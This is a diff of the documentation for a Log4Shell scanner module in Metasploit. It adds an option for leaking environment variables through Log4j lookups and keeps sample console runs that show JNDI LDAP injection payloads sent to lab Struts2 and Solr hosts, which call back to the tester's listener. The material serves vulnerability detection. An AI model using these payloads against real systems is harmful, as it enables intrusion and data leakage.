@@ -44,7 +44,7 @@ RUN apt-get update && \
 	apt-get clean && \
 	rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
-RUN curl https://dlcdn.apache.org/struts/2.5.28/struts-2.5.28-all.zip > struts-all.zip && \
+RUN curl https://archive.apache.org/dist/struts/2.5.28/struts-2.5.28-all.zip > struts-all.zip && \
 	unzip struts-all.zip && \
 	cp /struts-2.5.28/apps/struts2-showcase.war /bitnami/tomcat/webapps/
 ```
@@ -63,6 +63,11 @@ starting with `#` will be treated as comments. Lines may also contain the string
 injection point. This enables query parameters to be included in the request which are required for certain
 applications.
 
+### LEAK_PARAMS
+Additional parameters to leak, separated by the `^` character. For example the following would leak the USER and PATH
+environment variables: `${env:USER}^${env:PATH}`. See the [Log4j Lookups][log4j-lookups] wiki page for more information
+on available parameters.
+
 ### LDAP_TIMEOUT
 Time in seconds to wait to receive LDAP connections.
 
@@ -71,22 +76,22 @@ Time in seconds to wait to receive LDAP connections.
 ### Apache Struts2
 
 ```
-msf6 > use auxiliary/scanner/http/log4shell_scanner 
-msf6 auxiliary(scanner/http/log4shell_scanner) > set RHOSTS 192.168.159.128
+msf > use auxiliary/scanner/http/log4shell_scanner 
+msf auxiliary(scanner/http/log4shell_scanner) > set RHOSTS 192.168.159.128
 RHOSTS => 192.168.159.128
-msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST 192.168.159.128
+msf auxiliary(scanner/http/log4shell_scanner) > set SRVHOST 192.168.159.128
 SRVHOST => 192.168.159.128
-msf6 auxiliary(scanner/http/log4shell_scanner) > set RPORT 8080
+msf auxiliary(scanner/http/log4shell_scanner) > set RPORT 8080
 RPORT => 8080
-msf6 auxiliary(scanner/http/log4shell_scanner) > set TARGETURI /struts2-showcase/
+msf auxiliary(scanner/http/log4shell_scanner) > set TARGETURI /struts2-showcase/
 TARGETURI => /struts2-showcase/
-msf6 auxiliary(scanner/http/log4shell_scanner) > run
+msf auxiliary(scanner/http/log4shell_scanner) > run
 
 [*] Started service listener on 192.168.159.128:389 
 [+] Log4Shell found via /struts2-showcase/%24%7bjndi%3aldap%3a%24%7b%3a%3a-/%7d/192.168.159.128%3a389/r7yol50kgg7be/%24%7bsys%3ajava.vendor%7d_%24%7bsys%3ajava.version%7d%7d/ (java: BellSoft_11.0.13)
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/log4shell_scanner) > 
+msf auxiliary(scanner/http/log4shell_scanner) > 
 
 ```
 
@@ -95,8 +100,8 @@ msf6 auxiliary(scanner/http/log4shell_scanner) >
 Apache Solr is trivially exploitable by a remote and unauthenticated attacker when in its default configuration:
 
 ```
-msf6 > use auxiliary/scanner/http/log4shell_scanner
-msf6 auxiliary(scanner/http/log4shell_scanner) > run http://10.10.235.209:8983/ srvhost=10.9.4.245
+msf > use auxiliary/scanner/http/log4shell_scanner
+msf auxiliary(scanner/http/log4shell_scanner) > run http://10.10.235.209:8983/ srvhost=10.9.4.245
 
 [*] Started service listener on 10.9.4.245:389
 [+] 10.10.235.209:8983    - Log4Shell found via /solr/admin/cores?action=CREATE&wt=json&name=%24%7bjndi%3aldap%3a/10.9.4.245%3a389/vslscuy7m6q9pgfc18h/%24%7bsys%3ajava.vendor%7d_%24%7bsys%3ajava.version%7d%7d (java: Oracle Corporation_1.8.0_181)
@@ -104,3 +109,5 @@ msf6 auxiliary(scanner/http/log4shell_scanner) > run http://10.10.235.209:8983/ 
 [*] Sleeping 30 seconds for any last LDAP connections
 [*] Auxiliary module execution completed
 ```
+
+[log4j-lookups]: https://logging.apache.org/log4j/2.x/manual/lookups.html
